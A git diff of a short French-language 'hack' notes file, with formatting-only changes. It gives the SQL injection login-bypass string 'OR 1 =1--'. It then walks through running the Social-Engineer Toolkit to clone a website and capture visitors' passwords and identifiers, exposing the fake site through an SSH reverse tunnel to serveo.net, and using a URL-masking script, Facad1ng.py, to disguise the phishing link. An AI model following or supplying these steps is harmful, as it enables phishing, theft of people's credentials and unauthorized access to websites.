@@ -1,7 +1,7 @@
 language SQL reponse toujours vrai : 'OR 1 =1--'  - faille SQL                    (permet de contourner des mots de passe et autre faille dans une page web)
 
 ### linux hack faux site : mots de passe et identifiant repris 
-#copier toutes les commande une aune dans le terminal linux :
+copier toutes les commande une aune dans le terminal linux :  
  
 ## Installation
 
@@ -17,17 +17,17 @@ sudo apt upgrade -y
 clear
 sudo setoolkit
 ```
-#entrer y apres le password
-#puis choisissez 1,2,3 et l option 2
-#entrer ton ipv4 :
-#puis choisis un site que tu veux cloner
+entrer y apres le password  
+puis choisissez 1,2,3 et l option 2  
+entrer ton ipv4 :  
+puis choisis un site que tu veux cloner  
 
 ### creer un lien serveur local
 
 ```bash
 ssh -R 80:localhost:80 serveo.net -y
 ```
-#note le lien
+note le lien  
 ### Cloner le dépôt
 
 ```bash
@@ -54,6 +54,6 @@ pip3 install -r requirements.txt
 ```bash
 python3 Facad1ng.py
 ```
-#copie colle ton url que tu as noté
-#dans mots clé choisis login
-#puis choisis un des lien proposer
+copie colle ton url que tu as noté  
+dans mots clé choisis login  
+puis choisis un des lien proposer  
